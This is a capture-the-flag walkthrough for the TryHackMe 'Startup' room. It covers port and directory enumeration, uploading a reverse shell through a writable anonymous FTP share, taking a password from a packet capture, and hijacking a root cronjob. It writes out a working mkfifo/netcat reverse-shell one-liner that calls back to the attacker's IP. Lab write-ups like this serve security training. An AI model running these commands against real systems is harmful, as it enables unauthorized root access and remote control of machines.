# [Challenge](https://tryhackme.com/room/startup)

- # ENUM
	- ### nmap (` nmap -A -p- -T4 startup`):
		- ```PORT   STATE SERVICE VERSION
			21/tcp open  ftp     vsftpd 3.0.3
			| ftp-anon: Anonymous FTP login allowed (FTP code 230)
			| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
			| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
			|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
			| ftp-syst: 
			|   STAT: 
			| FTP server status:
			|      Connected to 10.9.1.212
			|      Logged in as ftp
			|      TYPE: ASCII
			|      No session bandwidth limit
			|      Session timeout in seconds is 300
			|      Control connection is plain text
			|      Data connections will be plain text
			|      At session startup, client count was 4
			|      vsFTPd 3.0.3 - secure, fast, stable
			|_End of status
			22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
			| ssh-hostkey: 
			|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
			|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
			80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
			|_http-title: Maintenance
			|_http-server-header: Apache/2.4.18 (Ubuntu)
			Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
	- ### gobuster (`gobuster dir -w /usr/share/wordlists/directory-list-lowercase-2.3-big.txt -x .txt,.html,.css,.js,.php -u http://startup -t 100`)
		- #### DIRECTORIES
			- `/files`
		- #### FILES
			- `/index.html`

- # EXPLOITATION
	- `http://startup/files/` -> Among Us meme in the big 2k25 🥀
		- ```Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
	- Ok, let's login into anonymous FTP and try to put a reverse shell in `/ftp` directory (we have the permissions). Obviously, we need to listen on our machine (`nc -lvnp 4444`)
		- Nice, now we have a reverse shell!
			- `/recipe.txt`: `Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.`

- # PRIVILEGE ESCALATION
	- There's a pcapng file: `/incidents/suspicious.pcapng`, let's put it into `/var/www/html/files/ftp/`.
		- There's Lennie's password: `c4ntg3t3n0ughsp1c3`
	- Spawn a `/bin/bash` shell (`python -c "import pty; pty.spawn('/bin/bash')")
	- There's an hidden cronjob (discovered thanks to `pspy`) that is runned every minute: `/etc/print.sh`
		- `2025/08/19 11:32:01 CMD: UID=0     PID=27365  | /bin/bash /etc/print.sh`
			- We can also see some scripts in the `/home/lennie/script` folder and another one in `/etc/print.sh`. Let's modify the last one (since we have the write permissions, 'cause the owner is Lennie): `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.212 8888 >/tmp/f` -> `nc -lnvp 8888`
				- Let's wait a minute and...
					- We're ROOT!
